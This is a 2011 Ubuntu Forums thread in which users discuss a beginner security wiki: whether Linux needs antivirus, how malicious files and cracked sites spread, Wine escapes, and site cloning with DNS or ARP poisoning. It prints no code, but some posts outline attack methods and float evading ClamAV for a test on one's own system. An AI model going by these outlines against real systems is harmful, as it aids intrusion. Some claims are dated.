
---

### Post by Ms. Daisy on 2011-11-11
> **vanhenryjr said:**
> My point, if you know what you are doing go right ahead and secure away, but if you are REALLY new realize many of these security measures will/can disable functionality.

imno and all that, where n=newbieI looked at Tomboy and I'm guessing that it uses a certain port to sync, and it must have been a port that we blocked with the firewall.  Hopefully someone far more advanced than myself can point out a fix for you. 

Your comment leads me to a point I was thinking about the other day.  How can a user easily find out what ports they need for the devices & services they're using?  We've got a list of common ones, but we can't provide an exhaustive list.  I would like to point users somewhere to find out what they've actually got on their individual machine.  How do you do that?  Can I type in "ls ports ls services" or something like that in terminal & get the computer to tell me?  Or do I need to scour the official documentation for each service?

 > **vanhenryjr said:**
> if you are REALLY new realize many of these security measures will/can disable functionalityAnd that's another good point.  As opsecshellshock said, we do need a "step zero."  Personally I'm willing to trade some decreased functionality for a more secure system. But I shouldn't assume that everyone else is willing to do that.

---

### Post by Ms. Daisy on 2011-11-11
Hola, folks.  I found this post in another thread:> **OrangeCrate said:**
> This article has been around a long time, but, it's worthwhile to post it again occasionally...

**The Truth About Linux and Viruses**
1. If you run Linux and only Linux, you do not need antivirus software.  In its efforts to make Windows easier to use, Microsoft simplified the  process of running executables under its operating system many years  ago. Not only can a user launch a program by clicking an e-mail  attachment, but it's possible for an executable to launch automatically  just by hitting the preview pane of some email packages, including older  versions of Outlook and Outlook Express. Scot's Newsletter Forums  member Nathan Williams has provided an excellent FAQ for the All Things  Linux forum explaining why Linux when used alone does not need antivirus  protection.
 
 Under Linux the steps for launching an executable from an e-mail are  separate, discrete steps. A user would have to read the email, save the  attachment, give the attachment executable permissions, and then run the  executable. And to be truly damaging, the latter two would have to be  done as root &#8212; not something informed users would allow.
 
 2. If you dual boot Linux and Windows and get a virus-infected mail in  Linux, it can NOT jump to your Windows partition. Nor can it spread over  the local network to other systems. You can even store the attachment  in your /home directory and open the zip or click the file, and it will  be dead in the water. Windows executables won't run under Linux. Linux  files need to be granted permission to become executable. And even then,  it can't spread beyond the home folder. (This is also why Linux AV  programs do not have a "live guard" module in them &#8212; the virus does not  execute or move.) You could even leave a virus executable there as long  as you wanted to without risk. Windows will not get infected, unless you  deliberately copy the virus to your Windows partition.
 
 3. If you dual boot, however, you better get a good antivirus program  for Windows. Microsoft's operating system and its bundled applications,  Outlook and Internet Explorer, offer users powerful functionality in  their attempts to be easy to use and easy to update. As a result, it's  all too easy for virus writers to exploit the same functionality in a  malicious way. Don't leave them an opening. Install an antivirus program  and keep it updated.
 
 4. The only time you'll need a Linux antivirus program is if you're  running a mail server. And that's just good social behavior. It's not to  protect your Linux server or client computer so much as to make sure  you don't pass a virus on to a Windows system.
 
 Think about it this way: If you have two warehouses, and you use the  first one to store cheese, are you going to place mouse-traps in the  second one where you only store stainless steel? I mean, be reasonable,  mice do not eat stainless steel! So don't let antivirus vendors make you  unnecessarily paranoid. 			 		

[http://www.linuxclues.com/articles/21.htm](http://www.linuxclues.com/articles/21.htm)This quote contradicts the Wiki.  We say there are actually some linux viruses.  This article is saying there aren't.  Thoughts?

---

### Post by Dangertux on 2011-11-11
> **Ms. Daisy said:**
> Hola, folks.  I found this post in another thread:This quote contradicts the Wiki.  We say there are actually some linux viruses.  This article is saying there aren't.  Thoughts?


I already posted in that thread.

---

### Post by haqking on 2011-11-11
> **Ms. Daisy said:**
> Hola, folks.  I found this post in another thread:This quote contradicts the Wiki.  We say there are actually some linux viruses.  This article is saying there aren't.  Thoughts?

[http://www.neowin.net/news/a-history-of-viruses-on-linux](http://www.neowin.net/news/a-history-of-viruses-on-linux)

[https://help.ubuntu.com/community/Linuxvirus](https://help.ubuntu.com/community/Linuxvirus)

There are none in the wild currently (that i currently know of) someone might correct me on that.

The common misconception however is that Linux cannot get one, it cannot be infected by a windows virus no (unless we refer to WINE based attacks or using the wine engine), but it doesnt mean a Linux virus cannot be created and released.

people often use the flawed argument about Linux having different file permission structure which is pure rubbish really.

The fact is malicious people have not yet targeted Linux directly with virus code as yet.

Linux AV solutions are fairly poor and often throw up false positives, and best only for use for scanning for Windows based viruses for file sharing, Linux AV has no heuristic technology so rendering useless for finding newly released malicious signatures.

And of course a virus per se is a small element in the larger collective of malware

IMHO

---

### Post by OpSecShellshock on 2011-11-11
It doesn't always take malware to do the job, either. Really, it's easy to just be made to/tricked into losing control of perfectly legitimate, native utilities and have them turned to bad ends. And of course a lot of these links are being kind of hair-splitty about terms. Sure, we all know that a virus and a trojan aren't the same thing, but people who haven't studied the various categories use "virus" as a stand-in for all malware, and I have to believe that anyone who writes introductory advice for users knows this. Certainly the people who develop fake anti-virus scripts know it.

Currently there are no Linux malware campaigns active in the wild, as haqking said. There are also no utilities or applications available for Linux that will keep an eye out for suspicious system hooks or monitor runtime activity for signs of anything suspicious. So rather than being ahead, we're actually kind of breaking even. The kind of anti-malware support we should have, to the extent we should have any, doesn't exist yet.

---

### Post by Dangertux on 2011-11-11
> **OpSecShellshock said:**
> It doesn't always take malware to do the job, either. Really, it's easy to just be made to/tricked into losing control of perfectly legitimate, native utilities and have them turned to bad ends. And of course a lot of these links are being kind of hair-splitty about terms. Sure, we all know that a virus and a trojan aren't the same thing, but people who haven't studied the various categories use "virus" as a stand-in for all malware, and I have to believe that anyone who writes introductory advice for users knows this. Certainly the people who develop fake anti-virus scripts know it.

Currently there are no Linux malware campaigns active in the wild, as haqking said. There are also no utilities or applications available for Linux that will keep an eye out for suspicious system hooks or monitor runtime activity for signs of anything suspicious. **So rather than being ahead, we're actually kind of breaking even. The kind of anti-malware support we should have, to the extent we should have any, doesn't exist yet.**


OMG I LOVE YOU!!! I've been saying this for a while everyone just looks at me like I have something strange on my face.

The reality is IF there were to be an aggressive campaign as you put it targeting Linux or Ubuntu users, we would all pretty much be in a bad spot. 

Heuristics and system monitoring just aren't there yet. The truth is we're kind of on the "honor system" with malware developers they leave us alone and we do nothing. The minute that changes Linux users will be in a bad way.

---

### Post by Thewhistlingwind on 2011-11-11
> **Dangertux said:**
> 
Heuristics and system monitoring just aren't there yet. The truth is we're kind of on the "honor system" with malware developers they leave us alone and we do nothing. The minute that changes Linux users will be in a bad way.

On the other hand, you have to remember that you need malware to study before you can write system monitoring and heuristics software. 

So until someone DOES start an aggressive malware campaign this software will not be written. Security is an arms race, no one invents a gun until someone else invents a bow.

I guess if you wanted to jump-start this process you could make a special network of some sort (VPN, etc.) that you have to essentially give everyone else legal permission to enter your computer to join. And then it's up to operators to try and keep the crackers out. The problem with that is protecting people from nasty stuff being distributed once their rooted.

---

### Post by Dangertux on 2011-11-11
> **Thewhistlingwind said:**
> On the other hand, you have to remember that you need malware to study before you can write system monitoring and heuristics software. 

So until someone DOES start an aggressive malware campaign this software will not be written. Security is an arms race, no one invents a gun until someone else invents a bow.

Well to an extent...  My guess would be that Linux malware (as does most malware) would capitalize on existing vulnerabilities. So you do have some baseline. Most malware developers aren't writing 0 day code just to get a RAT on a desktop system.

---

### Post by Ms. Daisy on 2011-11-11
I've received some excellent constructive criticism from a user that  wished to remain unassociated with this thread.  I'd like to bring up  some of his points for discussion, to see if we can't address them in  the Wiki.  Here's one of his comments:>   looking at Dangertux's firewall thread he states that one reason for a firewall is this:

&#8220;Another example that you are likely exposed to would be maliciously crafted media files, or perhaps a malicious ODT or PDF file. These are all common vectors of attack, and something you are relatively likely to encounter.&#8221;

Scary eh? But, let's focus on the &#8220;relatively likely&#8221; bit. I don't download media files from pirate sites. I only download PDF and ODT files from official sites. So the &#8220;relatively likely&#8221; for me is actually practically zero. 

Basically if you engage in criminal activity by downloading stuff illegally, should it come as any surprise that your fellow criminals may turn the tables on you?Can anyone summarize where one could encounter PDF & ODT files of a malicious nature?  My initial thought is that web sites can be cracked if they're poorly written (way too many of those, shame on you web developers) & bad guys can inject whatever they want.  Therefore, you can't be certain that your favorite official site hasn't been cracked.  Do I have my tin foil hat on or is that a real problem?

What's the real likelihood of someone surfing strictly official sites in encountering harmful things in general (beyond just PDF & ODT files)?  Does anyone have stats? OWASP has some good literature on web site vulnerabilities but it's awfully technical- if you're not a programmer, you'll be lost in the first paragraph.

---

### Post by Dangertux on 2011-11-11
> **Ms. Daisy said:**
> I've received some excellent constructive criticism from a user that  wished to remain unassociated with this thread.  I'd like to bring up  some of his points for discussion, to see if we can't address them in  the Wiki.  Here's one of his comments:Can anyone summarize where one could encounter PDF & ODT files of a malicious nature?  My initial thought is that web sites can be cracked if they're poorly written (way too many of those, shame on you web developers) & bad guys can inject whatever they want.  Therefore, you can't be certain that your favorite official site hasn't been cracked.  Do I have my tin foil hat on or is that a real problem?

What's the real likelihood of someone surfing strictly official sites in encountering harmful things in general (beyond just PDF & ODT files)?  Does anyone have stats? OWASP has some good literature on web site vulnerabilities but it's awfully technical- if you're not a programmer, you'll be lost in the first paragraph.

Your assumption that cracked sites are a big contributor to "drive by downloads" as people tend to call them is true. It's probably the vector that most users will have the most exposure to as well.

The anonymous poster's point is valid-ish. If you're downloading only from trusted repos, and other trusted sources then you're much less likely to run into a malicious file. That being said nothing is perfect and in theory a repo could be cracked, however that is tin-foil hat country so we won't go there.

If you get into PPA's and sharing files among friends or other not so trustworthy sources such as p2p file sharing, then the point becomes less valid. Of course you could always factor in things like apt-url and dns poisoning in conjunction to do something really naughty. Again that's a very targeted attack and pretty difficult to pull off.

Again the original argument is in terms of a malicious file, that is only ONE method by which a system can be compromised that a properly configured firewall would help mitigate. 

As far as stats go, the OWASP stuff is probably going to be the best in terms of accuracy and completeness. Maybe something from CERT might be comparable.

It's also very important to understand that if you visit a compromised site that has code in it that can exploit a vulnerability in your browser. There will be no option to say no given. This is why a firewall in conjunction with mandatory access controls is good.

---

### Post by OrangeCrate on 2011-11-11
> **Ms. Daisy said:**
> Hola, folks.  I found this post in another thread:This quote contradicts the Wiki.  We say there are actually some linux viruses.  **This article is saying there aren't**.  Thoughts?

Sorry, but, you're wrong. I'd suggest that you actually read the entire article prior to commenting. Thanks.

(I'll make it easy for you. Read the second paragraph.)

As I alluded to in my original post, some of the information in the article is a bit dated, but, the information provided, regarding the need of an antivirus program in Linux is still fundamentally correct. You don't need one, unless you're running a server, and that's not for your protection, but, to help prevent passing on viruses to Windows users.

---

### Post by OpSecShellshock on 2011-11-11
"Media files" can also refer to user-made/generated/uploaded Flash files embedded in web pages (it's not just Flash, could be any media type really). In fact these days that's probably more likely to be encountered by more people than p2p pirate media trojans. Media content on the web is just easier to get to and if it isn't blocked it'll just run unimpeded as soon as the page loads. Even image file formats can have code embedded in them. Anyway, enumerating all the different ways malicious code can be delivered isn't the thing to focus on. To the greatest extent possible what we need to do is stop it from doing whatever it's meant to do.

---

### Post by haqking on 2011-11-11
> **OrangeCrate said:**
> Sorry, but, you're wrong. I'd suggest that you actually read the entire article prior to commenting. Thanks.

(I'll make it easy for you. Read the second paragraph.)

As I alluded to in my original post, some of the information in the article is a bit dated, but, the information provided, regarding the need of an antivirus program in Linux is still fundamentally correct. You don't need one, unless you're running a server, and that's not for your protection, but, to help prevent passing on viruses to Windows users.

It is not that one is not needed.  It is that the ones that exist are essentially useless for Linux, and the fact there are none currently in the wild for Linux.  However it could easily happen that Linux could be targeted and the fact is we dont have any good solutions to combat it.

So in terms of what is wild then yes you could say one is not needed, however what is needed is a good anti malware solution with heuristic technology so Linux users are armed in the event to a degree.

If I had eight hours to chop down a tree, I'd spend six sharpening my axe - Abe Lincoln

Proper Planning and Preparation Prevents Poor Performance

---

### Post by Dangertux on 2011-11-11
So if I reverse engineer Li0n and make it exploit something other than an ancient bind vulnerability, say a current MySQL vulnerability , do a little voodoo so ClamAV doesn't catch it, video the whole thing owning a 10.04 LTS box can we end the debate? I'm tired of it lol

---

### Post by Thewhistlingwind on 2011-11-11
> **Dangertux said:**
> So if I reverse engineer Li0n and make it exploit something other than an ancient bind vulnerability, say a current MySQL vulnerability , do a little voodoo so ClamAV doesn't catch it, video the whole thing owning a 10.04 LTS box can we end the debate? I'm tired of it lol

Why so much effort? A hand-written script should suffice. (Python, Ruby, Bash and the GCC come with Ubuntu, that should be more than enough.)

It goes without saying that the victim is one of DangerTux's computers.

---

### Post by Dangertux on 2011-11-11
Yeah before this gets reported. This would be entirely for research purposes and the improvement of Ubuntu's security posture. Tested entirely on systems I own with my permission. 

I agree with ruby I love ruby. That being said I picked li0n because it's known and has a good delivery system and a decent framework in place for egghunting.

---

### Post by larrypg on 2011-11-11
Hello all,  Having been around computers for a few years...at some point in those years newsgroups were rather popular (now I am guessing most isp's do not have them)...but would one not need some sort of antivirus (anti-malware) program to check files downloaded?  By the way yes I know that if you download from newsgroups you are asking for what you get but that is not the question.  I know that most malware is windows specific but there is some reason that there is still many newsgroup providers out there and I am guessing that not all of them use windows only.

---

### Post by haqking on 2011-11-11
> **larrypg said:**
> Hello all,  Having been around computers for a few years...at some point in those years newsgroups were rather popular (now I am guessing most isp's do not have them)...but would one not need some sort of antivirus (anti-malware) program to check files downloaded?  By the way yes I know that if you download from newsgroups you are asking for what you get but that is not the question.  I know that most malware is windows specific but there is some reason that there is still many newsgroup providers out there and I am guessing that not all of them use windows only.

the newsgroups are still there, just use a newsreader there are hundreds to choose from and still many thousands of newsgroups

some older but still valid links
[http://www.slyck.com/Newsgroups_Guide_Ubuntu_Linux_Guide](http://www.slyck.com/Newsgroups_Guide_Ubuntu_Linux_Guide)
[http://packages.ubuntu.com/hardy/news-reader](http://packages.ubuntu.com/hardy/news-reader)
[http://www.usenet.org.uk/newsgroups.html](http://www.usenet.org.uk/newsgroups.html)
[http://usenet-news.net/](http://usenet-news.net/)
[http://freenews.maxbaud.net/](http://freenews.maxbaud.net/)

As for the AV read the posts above and the wiki referenced in this thread [https://wiki.ubuntu.com/BasicSecurity](https://wiki.ubuntu.com/BasicSecurity)

---

### Post by Dangertux on 2011-11-12
> **OrangeCrate said:**
> Sorry, but, you're wrong. I'd suggest that you actually read the entire article prior to commenting. Thanks.

(I'll make it easy for you. Read the second paragraph.)

As I alluded to in my original post, some of the information in the article is a bit dated, but, the information provided, regarding the need of an antivirus program in Linux is still fundamentally correct. You don't need one, unless you're running a server, and that's not for your protection, but, to help prevent passing on viruses to Windows users.

I'm sorry , I don't see anything, factually relevant in this article still. Let's break it down section by section shall we?

> 
Conventional wisdom says that a virus scanner is one of three protections    necessary these days for computers connected to the Internet. (The other two    being a spyware scanner or two, and a trainable spam filter.) The same wisdom    also says that the only reason Linux and Macintosh computers don't see the same    level of virus attacks as Windows PCs is because Windows PCs are so much more    prevalent.
This is true : this is the "honor system" I spoke about earlier.

> 
While this may be partly true, it's not the whole reason. According to various    virus lists, there are less than 100 known viruses for Linux, none of which    spread the way a Windows virus does. Meanwhile, there are thousands and thousands    of Windows viruses. With the so-called discovery of a Linux/Windows virus, more    light is being shined on the subject of Linux security.
This is outdated : the number of known malware signatures for Linux based systems is closer to 1000 at this point.

> 
 1. If you run Linux and only Linux, you do not need antivirus software.    In its efforts to make Windows easier to use, Microsoft simplified the process    of running executables under its operating system many years ago. Not only can    a user launch a program by clicking an e-mail attachment, but it's possible    for an executable to launch automatically just by hitting the preview pane of    some email packages, including older versions of Outlook and Outlook Express.    Scot's Newsletter Forums member Nathan Williams has provided an [excellent    FAQ]("http://forums.scotsnewsletter.com/index.php?act=ST&f=14&t=503&st=252") for the All Things Linux forum explaining why Linux when used alone    does not need antivirus protection.
  Under Linux the steps for launching an executable from an e-mail are separate,    discrete steps. A user would have to read the email, save the attachment, give    the attachment executable permissions, and then run the executable. And to be    truly damaging, the latter two would have to be done as root &#8212; not something    informed users would allow. (For more information see [Ch-    Ch- Changing File Permissions]("http://www.linuxclues.com/articles/16.htm").)
Canonical has gone through the same effort to make Ubuntu easier to use. Examples of one click methods for installing malware include (malicious apt-url, debian package manager, contaminated or malicious repos or ppas, and browser based or file format exploits some of which don't even need a click or user permission in the first place to execute a payload). 

The file permissions argument is flawed as well : for instance chmod +x or chmod 755 a malicious file, copy it to another ubuntu install and you will find its permissions are intact, complete with executable bit set. I've already discussed exactly how far you can get as a non-root user, particularly in an a sudo based environment. If need be I can demo privilege escalation and show you how easy it is to root a box once you have a foothold in the system. (In lieu of me doing it ,  you can google it I'm sure you will find plenty of results. If not post and I will demo it this weekend.) In addition to this, you can also realize the mess a malicious program having access to your /home directory could cause, since that is where your browser stores saved credentials, and you keep all of your personal data. It does not need root privileges to send this data elsewhere.

> 
2. If you dual boot Linux and Windows and get a virus-infected mail    in Linux, it can NOT jump to your Windows partition. Nor can it spread over    the local network to other systems. You can even store the attachment in your    /home directory and open the zip or click the file, and it will be dead in the    water. Windows executables won't run under Linux. Linux files need to be granted    permission to become executable. And even then, it can't spread beyond the home    folder. (This is also why Linux AV programs do not have a "live guard" module    in them &#8212; the virus does not execute or move.) You could even leave a virus    executable there as long as you wanted to without risk. Windows will not get    infected, unless you deliberately copy the virus to your Windows partition.
This is true, however malicious applications coded for Windows run under Wine can pass system calls to the linux kernel. I've demonstrated it, and I've also demonstrated how to break out of Wine and turn a Windows shell into a persistent Linux shell.  Demo [here]("http://dangertux.wordpress.com/2011/09/17/the-truth-about-windows-malware-wine-and-ubuntu/") and [here ]("http://dangertux.wordpress.com/2011/10/20/breaking-down-the-barrier-all-you-do-is-hurt-me/")(part 2 persistence). This is extremely easy to do and you could replicate it on your own Ubuntu install if you'd like to test it.

Paragraph 3 is not relavent to the discussions so I'm omitting it.

> 
4. The only time you'll need a Linux antivirus program is if you're    running a mail server. And that's just good social behavior. It's not to protect    your Linux server or client computer so much as to make sure you don't pass    a virus on to a Windows system.
Let's be realistic, this might have been true when the article was written. However modern anti-malware solutions do a lot more than scan file signatures and compare them to databases. They actually do pretty complicated heuristic analysis of various application behavior (injecting libraries, injecting executable memory, creating connetions, writing to shared memory, hooking processes, all types of things that can denote malicious behavior)


> 
Think about it this way: If you have two warehouses, and you use the first    one to store cheese, are you going to place mouse-traps in the second one where    you only store stainless steel? I mean, be reasonable, mice do not eat stainless    steel! So don't let antivirus vendors make you unnecessarily paranoid
Linux is not much more difficult to compromise than Windows, and its certainly not done in a different manner. The education level of the average linux user has changed. They are unaware of the threats to them because they are blinded by the obscurity of their operating system. Linux, Ubuntu and it's associated user base is no longer the stainless steel this article references but an all you can eat buffet.

Hope this clarifies feel free to ask any questions you may have.[FONT=Verdana,Arial,Helvetica,Sans][SIZE=2]
[/SIZE][/FONT]

---

### Post by vasa1 on 2011-11-12
> **Ms. Daisy said:**
> ... Can anyone summarize where one could encounter PDF & ODT files of a malicious nature?  My initial thought is that web sites can be cracked if they're poorly written ...

What's the real likelihood of someone surfing strictly official sites in encountering harmful things in general ...

Just in case it hasn't already been mentioned, one's inbox is a good place to find nasties. Also, many people known to us such as friends, relative_s_, co-workers, unintentional forward stuff which could include nasties. Facebook is another fertile source.

I don't like things like Thunderbird or Evolution.

---

### Post by vasa1 on 2011-11-12
> **Dangertux said:**
> ... Examples of one click methods for installing malware include (malicious apt-url, debian package manager, contaminated or malicious repos or ppas,

^^^^ Needs to be in the wiki in **bold**.
> **Dangertux said:**
> ...
and browser based or file format exploits some of which don't even need a click or user permission in the first place to execute a payload)...
Wouldn't AppArmor help here to at least limit things?

---

### Post by OrangeCrate on 2011-11-12
> **Dangertux said:**
> 

<snip>

Hope this clarifies feel free to ask any questions you may have.



No, no questions from me. Honestly, I'm just not as paranoid about all things Linux security, as you appear to be, so, I'll back out of the conversation, and let you go your merry way. Good luck (and don't let the bed bugs bite).

:)

---

### Post by Dangertux on 2011-11-12
> **vasa1 said:**
> ^^^^ Needs to be in the wiki in **bold**.

Wouldn't AppArmor help here to at least limit things?

Yes it can. Now , how many people in this thread have their browser confined by some sort of mandatory access controls?

Also I am not paranoid, I am realistic. I also don't like to lie to people when they ask if Lunux/ubuntu can be compromised. Yes it can. It's fairly easy to do it. Will it happen to you, I don't know I'm not a psychic but that wasn't the question. The question is can it happen.

---

### Post by OpSecShellshock on 2011-11-12
Oh and what is with non-repo .deb files from any point of origin invoking the USC for installation? Doesn't that make things look more official than they actually are? I've never installed such a thing since it switched over to that, but a little pretty social engineering could probably lead to any number of bad situations.

There are more things to keep in mind where malware is concerned, too. Some folks out there advise even Windows users to maintain a Linux machine for the purpose of doing more sensitive things. Not a lot of people heed that advice, but there are quite a few new users I see on these boards who say the came to Ubuntu for security. If it takes hold with more people and/or enterprises then it's bound to attract the interest of criminals (who have probably already developed, but just not deployed, at least a little bit of malware--all versions of SpyEye and the non-current versions of TDSS are freely available for anyone who is ambitious enough to try and port them).

Also, it's making headway as the embedded OS of choice for some laptop manufacturers. And of course there's a push into emerging markets around the world, where people have computers but don't want to or can't afford to license Windows but don't want to put their fates in the hands of pirated OS installations.

Not trying to scare anyone, but these are things to keep in mind. If some sort of malicious software campaign targets these systems, we won't know about it until a certain critical mass of installations are affected, at which point it might be too late to definitively tell if we're among them.

---

### Post by Dangertux on 2011-11-12
> **OpSecShellshock said:**
> Oh and what is with non-repo .deb files from any point of origin invoking the USC for installation? Doesn't that make things look more official than they actually are? I've never installed such a thing since it switched over to that, but a little pretty social engineering could probably lead to any number of bad situations.

There are more things to keep in mind where malware is concerned, too. Some folks out there advise even Windows users to maintain a Linux machine for the purpose of doing more sensitive things. Not a lot of people heed that advice, but there are quite a few new users I see on these boards who say the came to Ubuntu for security. If it takes hold with more people and/or enterprises then it's bound to attract the interest of criminals (who have probably already developed, but just not deployed, at least a little bit of malware--all versions of SpyEye and the non-current versions of TDSS are freely available for anyone who is ambitious enough to try and port them).

Also, it's making headway as the embedded OS of choice for some laptop manufacturers. And of course there's a push into emerging markets around the world, where people have computers but don't want to or can't afford to license Windows but don't want to put their fates in the hands of pirated OS installations.

Not trying to scare anyone, but these are things to keep in mind. If some sort of malicious software campaign targets these systems, we won't know about it until a certain critical mass of installations are affected, at which point it might be too late to definitively tell if we're among them.

I agree that it will become more popular to create malware for Linux as it becomes more popular. Need an example? How many IOS exploit POC's were running around BEFORE it was the imbedded OS in an iphone. Yeah maybe at Sec Bsides as a bad joke. Now every 15 year old fires up metasploit and can own an iphone 3gs while he's eating a big mac at mcdonald's lol.

As far as USC firing up  with out of band debian packages I'm pretty sure that is just because it is the default replacement for dpkg's GUI. Plus it gives you a nifty new way to read pkgroot/DEBIAN/control. I would imagine it DOES make SE that much easier.

---

### Post by vasa1 on 2011-11-12
> **Dangertux said:**
> Yes it can. Now , how many people in this thread have their browser confined by some sort of mandatory access controls?...
Topic for a poll? I've done Firefox. But still have to do Chrome and Privoxy.

---

### Post by OpSecShellshock on 2011-11-12
> **vasa1 said:**
> Topic for a poll? I've done Firefox. But still have to do Chrome and Privoxy.

Yeah, so... confession time! No, but I'm just being lazy. I'll get to it soon, promise!

---

### Post by haqking on 2011-11-12
> **OpSecShellshock said:**
> Yeah, so... confession time! No, but I'm just being lazy. I'll get to it soon, promise!

+1

except for the get to it soon part ;-)

I am a apathetic procrastinator when it comes to system security on my own system LOL

---

### Post by vasa1 on 2011-11-12
Here's what I did:
[http://ubuntuforums.org/showpost.php?p=11444126&postcount=180](http://ubuntuforums.org/showpost.php?p=11444126&postcount=180)

---

### Post by Ms. Daisy on 2011-11-12
OK, so regarding the anti-virus discussion in the Wiki, I want to change what we've got because currently I think it's a bit misleading to a noob (i.e. me).  And the recurring virus arguments in this forum have officially driven me completely insane mainly because EVERYONE FRICKING AGREES that you shouldn't install existing anti-virus software on an Ubuntu!!!!!  (breathe Daisy, breathe)  Before the guys in the white coats get here to cart me away in the padded van, I'm writing this alternative for the Wiki:

**Fact**: Currently in reality, there are no known viruses on the big bad web designed to target Linux. A few targeting Windows can execute on a Linux. 

**Fact**: Very few people recommend existing anti-virus software for Linux machines for technical reasons that noobs don't need to understand. For security experts, it's not that one isn't needed, it's that one isn't available.

**Fact**: If you focus entirely on viruses then you are ignoring the vast majority of real threats to your Ubuntu machine.

**Fact**: If you follow the steps in the Wiki, you will have a decent defense built to protect your machine from viruses as well as the other more pressing threats out there.

 

 

 Sec experts (you know who you are), please comment whether you can climb aboard my logic train.   
 

 And the non-paranoid out there (I know you're reading), please comment whether you can climb aboard, too.

---

### Post by Dangertux on 2011-11-12
> **OpSecShellshock said:**
> Yeah, so... confession time! No, but I'm just being lazy. I'll get to it soon, promise!

I don't run apparmor/SELinux profiles for anything, don't use anti-malware I downgraded to a 2.4 series kernel, my machine is directly connected and I'm running MySQL 5.1 with OpenSSL (YaSSL) 1.9.8 as root , no firewall, and no IDS. My hypocracy knows no bounds.

[QUOTE=Ms. Daisy]
OK, so regarding the anti-virus discussion in the Wiki, I want to change  what we've got because currently I think it's a bit misleading to a  noob (i.e. me).  And the recurring virus arguments in this forum have  officially driven me completely insane mainly because EVERYONE FRICKING  AGREES that you shouldn't install existing anti-virus software on an  Ubuntu!!!!!  (breathe Daisy, breathe)  Before the guys in the white  coats get here to cart me away in the padded van, I'm writing this  alternative for the Wiki:

**Fact**: Currently in reality, there are no known viruses on the big  bad web designed to target Linux. A few targeting Windows can execute  on a Linux. 

**Fact**: Very few people recommend existing anti-virus software for  Linux machines for technical reasons that noobs don't need to  understand. For security experts, it's not that one isn't needed, it's  that one isn't available.

**Fact**: If you focus entirely on viruses then you are ignoring the vast majority of real threats to your Ubuntu machine.

**Fact**: If you follow the steps in the Wiki, you will have a decent  defense built to protect your machine from viruses as well as the other  more pressing threats out there.

 

 

 Sec experts (you know who you are), please comment whether you can climb aboard my logic train.   
 

 And the non-paranoid out there (I know you're reading), please comment whether you can climb aboard, too.
[/QUOTE]

Change it to read something like this and I'm in on it.

**Fact**: Currently in reality, there are no known viruses on the big  bad web designed to target Linux. A few targeting Windows can execute in a manner that could allow compromise of a Linux system via an interpreter layer like Wine.
 
 **Fact**: Very few people recommend existing anti-virus software for  Linux machines. Ultimately there aren't many decent free anti-malware solutions available. Enterprise class solutions are good, but the consumer grade products aren't on par with their Windows counterparts enough to warrant their use.
 
 **Fact**: If you focus entirely on viruses then you are ignoring the vast majority of real threats to your Ubuntu machine.
 
 **Fact**: If you follow the steps in the Wiki, you will have a decent  defense built to protect your machine from viruses as well as the other  more pressing threats out there. *

*We need to finish the Wiki and make that statement true.


That's my suggestions.

On a personal note -- you're doing great with this keep your head down, you're almost there :-)

---

### Post by haqking on 2011-11-12
> **Dangertux said:**
> I don't run apparmor/SELinux profiles for anything, don't use anti-malware I downgraded to a 2.4 series kernel, my machine is directly connected and I'm running MySQL 5.1 with OpenSSL (YaSSL) 1.9.8 as root , no firewall, and no IDS. My hypocracy knows no bounds.

Every builder i know needs to work on his own house, every mechanic i know has an oil leak somewhere on their own car, and every IT Sec guy i know pays little or no real attention to their own machine (but i think that is a safety in own self-confidence of being able to restore with little or no problem) besides its interesting to see your own machine get pwn3d and infected and trashed from someone halfway across the world ;-)

---

### Post by SparTacux on 2011-11-12
You've covered quite a bit about security and protecting your system but I think a few techniques in avoiding scams is a must.

Do you want to enter your credit card details on a fake site?  How do you tell if it's fake or not?
It probably doesn't come under security but a is essential knowledge in my opinion.

Oh - and don't go following those links to wordpress sites ;-)

---

### Post by Ms. Daisy on 2011-11-12
> **SparTacux said:**
> You've covered quite a bit about security and protecting your system but I think a few techniques in avoiding scams is a must.

Do you want to enter your credit card details on a fake site?  How do you tell if it's fake or not?
It probably doesn't come under security but a is essential knowledge in my opinion.

Oh - and don't go following those links to wordpress sites ;-)While I agree that this is all essential information, in the Wiki I am disinclined to explain the bagillion ways you can get cracked through social engineering & scams.  There's just too much to explain. It would belong on it's own Wiki page, and it's not specific to Ubuntu. 

The focus of the Wiki is to give new users a sound base for securing their Ubuntu, someplace to start that won't overwhelm them.  To paraphrase the anonymous contributor, if you can't explain it quickly, then it's not a noob guide.  SparTacux, if you'd like to create a synopsis of important issues like the ones you bring up, or if you know of a good existing explanation, then it would be a great idea to link to it from the Wiki. But IMO, there just isn't room to include it within the body of the Wiki.

---

### Post by Dangertux on 2011-11-12
> **Ms. Daisy said:**
> While I agree that this is all essential information, in the Wiki I am disinclined to explain the bagillion ways you can get cracked through social engineering & scams.  There's just too much to explain. It would belong on it's own Wiki page, and it's not specific to Ubuntu. 

The focus of the Wiki is to give new users a sound base for securing their Ubuntu, someplace to start that won't overwhelm them.  To paraphrase the anonymous contributor, if you can't explain it quickly, then it's not a noob guide.  SparTacux, if you'd like to create a synopsis of important issues like the ones you bring up, or if you know of a good existing explanation, then it would be a great idea to link to it from the Wiki. But IMO, there just isn't room to include it within the body of the Wiki.

Well -- I think we can address "fake sites" if you will easily in a manner that DOES apply to Ubuntu. In fact some of the things we discuss also cover it (sort of).

If you mean fake site like site cloning a site, and harvessting credentials, or site cloning it with a malicious iframe  injecting a payload then using a technique like DNS or ARP poisoning to get a user to visit your "clone" or maybe just a simple link or URL shortener; we can cover some of that. Obviously the URL shorteners and links are going to fall back to common sense. 

In the case of the DNS / ARP poisoning if the site cloned is SSL you're not going to have their SSL certificate, so a decent amount of paying attention should alert the user that the site isn't legit. If it's not an SSL site, then there isn't a lot of warning you will get. However, decent browser security measures (addons) should stop the majority of browser exploits. Of course someone could just harvest all the GET/POST requests on the site and probably come up with your credentials, but that narrows it down to a pretty targeted attack.

Hope this helps.

P.S : Ms. Daisy what do you think about my suggestions on the thing you posted on the last page about AV stuff?

---

### Post by Ms. Daisy on 2011-11-12
> **Dangertux said:**
> P.S : Ms. Daisy what do you think about my suggestions on the thing you posted on the last page about AV stuff?I seized upon it and stuck it in the Wiki nearly verbatim.> **Dangertux said:**
> Well -- I think we can address "fake sites" if you will easily in a  manner that DOES apply to Ubuntu. In fact some of the things we discuss  also cover it (sort of).

If you mean fake site like site cloning a site, and harvesting  credentials, or site cloning it with a malicious iframe  injecting a  payload then using a technique like DNS or ARP poisoning to get a user  to visit your "clone" or maybe just a simple link or URL shortener; we  can cover some of that. Obviously the URL shorteners and links are going  to fall back to common sense. 

